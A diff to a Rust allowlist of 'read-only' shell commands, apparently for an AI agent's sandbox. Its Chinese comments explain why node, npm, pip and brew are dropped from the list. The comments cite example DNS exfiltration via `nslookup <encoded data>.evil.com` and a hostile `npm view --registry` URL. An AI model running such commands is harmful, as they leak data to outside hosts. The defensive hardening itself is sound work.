@@ -13,11 +13,20 @@
 // - `env`：它是命令**前缀**不是命令，被它包住的真命令才是分类对象。光秃秃的
 //   `env` 会把环境变量整个倒进 transcript，也不算只读。
 // - `dig` / `ping` / `nslookup` / `traceroute`：按参数里的主机名发 DNS 查询，
-//   `nslookup <编码后的数据>.evil.com` 就把数据带出去了。
+//   `nslookup <编码后的数据>.evil.com` 就把数据带出去了。`npm view`
+//   （`--registry=https://evil/`）、`brew info` / `brew search`、
+//   `git remote show <URL>` 同理：要联网，主机由参数决定。`git remote` 只留
+//   不联网的写法（光秃秃、`-v`、`get-url`），见 `git_forfeits_read_only`。
+// - `brew`：整个不收。它按 `HOMEBREW_*` 变量拉起浏览器、编辑器等别的程序，
+//   `brew list` 也读这些变量。
 // - `cargo metadata` / `cargo tree`：要问 rustc，而项目的 `.cargo/config.toml`
 //   能把 rustc 换成任意程序（`build.rustc-wrapper`）；`cargo` / `rustc
 //   --version` 与 `rustup show` 跑的是 `rust-toolchain.toml` 指定的工具链，
 //   它可以是一个路径。
+// - `node` / `npm` / `pip`（`--version`、`list`、`show` 也不收）：装了
+//   asdf / nvm / volta / pyenv 时它们是 shim，按项目里的 `.tool-versions` /
+//   `.nvmrc` / `.python-version` / `package.json` 选二进制，asdf 还认
+//   `path:`，等于让项目指定一个任意程序。
 //
 // 留在名单里但受参数约束的：`find`（`-exec` 家族见 `FIND_UNSAFE_PREDICATES`）、
 // 以及所有会读文件的命令（`cat`/`head`/`tail`/`xxd`/`strings`/`od`/`hexdump`/
@@ -145,16 +154,8 @@ pub(super) const READ_ONLY_PREFIXES: &[&str] = &[
     "git stash list",
     "git tag",
     "git cherry",
-    // No `cargo` or `rustc` at all: see the note at the top of this file.
-    "node --version",
-    // 包管理查询
-    "pip list",
-    "pip show",
-    "npm list",
-    "npm view",
-    "brew list",
-    "brew info",
-    "brew search",
+    // No `cargo`, `rustc`, `node`, `npm`, `pip` or `brew` at all: see the
+    // note at the top of this file.
     // Rustup 信息
     "rustup toolchain list",
     // Docker 只读
